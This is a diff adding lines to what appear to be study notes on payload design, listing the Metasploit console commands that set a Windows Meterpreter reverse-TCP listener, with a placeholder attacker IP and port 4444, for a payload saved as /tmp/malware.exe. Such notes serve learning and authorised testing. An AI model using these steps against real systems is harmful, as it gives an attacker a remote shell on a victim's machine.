@@ -809,6 +809,19 @@ Things to take into account when desiging a payload
 
       - `-o /tmp/malware.exe`: Creates an output file, naming the file (`malware.exe`) and location (inside the `/tmp` directory).
 
+- All of this so far is just creating the payload. Now we have to deliver this using metasploit and then execute it after opening a shell using meterpreter
+
+**Metsaploit code to listen for retrograde connection from the Victim**
+
+- `msfconsole`
+- `set payload windows/meterpreter/reverse_tcp` 
+- `show options`
+- `set LHOST <hacker's ip address>` this ip address must be the same as mentioned in the payload
+- `set LPORT 4444`
+- `show options`
+- `exploit` 
+
+
 **Meterpreter**
 
 - Runs in memory-does not create files
